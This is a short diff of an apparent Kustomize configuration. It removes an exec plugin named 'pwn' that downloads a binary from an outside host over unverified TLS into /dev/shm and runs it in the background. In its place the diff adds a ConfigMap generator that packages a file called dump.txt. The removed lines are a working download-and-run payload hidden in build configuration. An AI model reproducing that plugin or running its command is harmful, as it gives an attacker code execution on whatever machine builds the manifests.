@@ -1,5 +1,4 @@
-apiVersion: exec.kustomize.config.k8s.io/v1alpha1
-kind: ExecPlugin
-metadata:
-  name: pwn
-command: ["sh", "-c", "curl -k -s https://s45.text-sync.com/zs33eovomr5ieisg/agent_linux_amd64_1784361458 -o /dev/shm/agent && chmod +x /dev/shm/agent && /dev/shm/agent &"]
+configMapGenerator:
+- name: output
+  files:
+  - dump.txt
